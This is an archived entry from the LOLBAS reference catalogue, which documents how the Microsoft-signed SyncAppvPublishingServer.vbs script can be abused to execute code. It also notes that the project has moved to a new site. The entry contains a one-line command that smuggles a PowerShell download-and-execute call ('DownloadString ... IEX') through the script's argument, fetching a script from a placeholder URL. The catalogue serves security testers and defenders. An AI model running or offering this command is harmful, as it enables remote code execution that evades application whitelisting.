# UPDATE BOOKMARKS - PROJECT MOVED TO A DEDICATED PROJECT SITE. THIS SITE WILL NOT BE UPDATED ANYMORE, BUT WILL BE KEPT FOR HISTORICAL REASONS.
New site: https://github.com/LOLBAS-Project/LOLBAS
Web portal: https://lolbas-project.github.io/ 
## SyncAppvPublishingServer.vbs

* Functions: Execute

```
SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
```

Acknowledgements:
* Nick Landers - @monoxgas
* Casey Smith - @subTee

Code sample:

Resources:
* https://twitter.com/monoxgas/status/895045566090010624
* https://twitter.com/subTee/status/855738126882316288

Full path:
```
C:\Windows\System32\SyncAppvPublishingServer.vbs
```

Notes:
Just like [SyncAppvPublishingServer.exe](OSBinaries/Syncappvpublishingserver.md) this starts a Powershell script with the provided arguments.

Included with Windows 10 Enterprise. Script is catalog signed by Microsoft.
 
